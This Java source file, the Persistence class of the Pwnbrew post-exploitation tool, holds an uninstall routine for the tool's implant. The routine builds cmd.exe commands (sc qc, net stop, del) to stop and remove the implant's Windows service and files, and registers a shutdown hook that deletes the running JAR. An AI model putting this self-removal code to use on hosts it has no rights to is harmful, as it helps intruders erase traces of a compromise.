/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

package pwnbrew;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import pwnbrew.manager.CommManager;
import pwnbrew.misc.LoaderUtilities;
import pwnbrew.misc.RuntimeRunnable;
import pwnbrew.misc.Utilities;


/**
 *  
 */
final public class Persistence {

    private static final String NAME_Class = Persistence.class.getSimpleName();
    
    
    // ==========================================================================
    /**
     * Constructor
     */
    private Persistence() {
    }

    // ==========================================================================
    /**
     * Ensures the directory represented by the given {@link File} exists.
     * <p>
     * If the directory already exists this method does nothing; otherwise this
     * method will attempt to create it. This method will also attempt to create
     * any necessary but non-existing parents of the given directory.
     * 
     * @param directory a {@code File} representing the directory
     * 
     * @throws IOException if the directory did not exist and could not be created
     */
    public static void ensureDirectoryExists( File directory ) throws IOException {
      
        if( directory == null )
            throw new IOException( "Could not create a directory, the given File is null." );
      
        if( !directory.exists() && !directory.mkdirs() ) 
                throw new IOException(
                        new StringBuilder( "Could not create the directory \"" )
                        .append( directory ).append( "\"" ).toString() );
          

    }

    // ========================================================================
    /**
     *  Attempts to cleanup all files on disk and remove the client.
     * 
     * @param passedManager
     */
    public static void uninstall( CommManager passedManager ) {    

        if( Utilities.isStaged() ){
            
            try {
                Class stagerClass = Class.forName("stager.Stager");
                Field aField = stagerClass.getField("serviceName");
           
                Object anObj = aField.get(null);
                if( anObj instanceof String ){

                    //Cast to string
                    String svcStr = (String)anObj;
                    if( !svcStr.isEmpty() ){
                        
                        //Tell the service to stop and restart
                        final List<String> strList = new ArrayList<>();
                        strList.add("cmd.exe");
                        strList.add("/c");
                        strList.add("sc qc \"" + svcStr + "\"");

                        //Get the path to the service
                        RuntimeRunnable aCommand = new RuntimeRunnable( strList.toArray( new String[strList.size()]) );
                        aCommand.run();

                        String output = aCommand.getStdOut().trim().toLowerCase();
                        String theSvcPath = null;
                        String[] lines = output.split("\n");
                        for( String aLine : lines){
                            if(aLine.contains("binary_path_name")){
                                theSvcPath = aLine.substring( aLine.indexOf(":") + 1).trim();
                                break;
                            }
                        }  
                       

                        //Stop the svc, Remove the reg entry, delete files
                        final List<String> cleanupList = new ArrayList<>();
                        cleanupList.add("cmd.exe");
                        cleanupList.add("/c");
                        
                        StringBuilder aSB = new StringBuilder();
                        aSB.append("net stop \"").append(svcStr).append("\"");
                        
                        if(theSvcPath != null ){
                            aSB.append(" && ").append(theSvcPath).append(" -u");
                            aSB.append(" && del ").append(theSvcPath);
                            aSB.append(" && del ").append( Utilities.getClassPath() );
                        }
                        
                        cleanupList.add(aSB.toString());
                        try{
                            Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
                        } catch(IOException ex){            
                        }                        
                        
                    } else {
                    
                        //Add a hook to delete the JAR
                        Runtime.getRuntime().addShutdownHook(new Thread() {
                            @Override
                            public void run(){

                                //Remove JAR if that's how we are running
                                File theClassPath = Utilities.getClassPath();        
                                if( theClassPath != null && theClassPath.isFile()){ 
                                    ClassLoader theClassLoader = getContextClassLoader();                   

                                    //Close the loader
                                    LoaderUtilities.unloadLibs(theClassLoader);

                                    //Delete the JAR
                                    theClassPath.delete();                        

                                }

                            }
                        });        

                        //Shutdown the client
                        passedManager.shutdown();      
                    
                    }              
                    
                }
                
            } catch (ClassNotFoundException | NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException ex) {
            }
            
        }      

    }

}/* END CLASS Directories */
